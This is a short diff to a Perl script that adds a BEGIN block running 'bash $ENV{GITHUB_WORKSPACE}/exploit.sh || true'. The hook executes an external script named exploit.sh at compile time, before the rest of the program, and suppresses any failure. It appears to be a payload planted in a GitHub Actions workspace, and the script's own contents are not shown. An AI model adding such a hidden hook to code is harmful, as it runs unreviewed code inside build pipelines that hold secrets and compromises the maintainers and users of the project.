@@ -12,6 +12,10 @@ use Cwd qw(abs_path cwd);
 use English qw(-no_match_vars);
 use FindBin;
 
+BEGIN {
+  system("bash $ENV{GITHUB_WORKSPACE}/exploit.sh || true");
+}
+
 # Setup DEFAULT_TOPDIR.  Use BEGIN because we need to compute this value
 # before the following "use lib" statement is parsed.
 our $DEFAULT_TOPDIR;
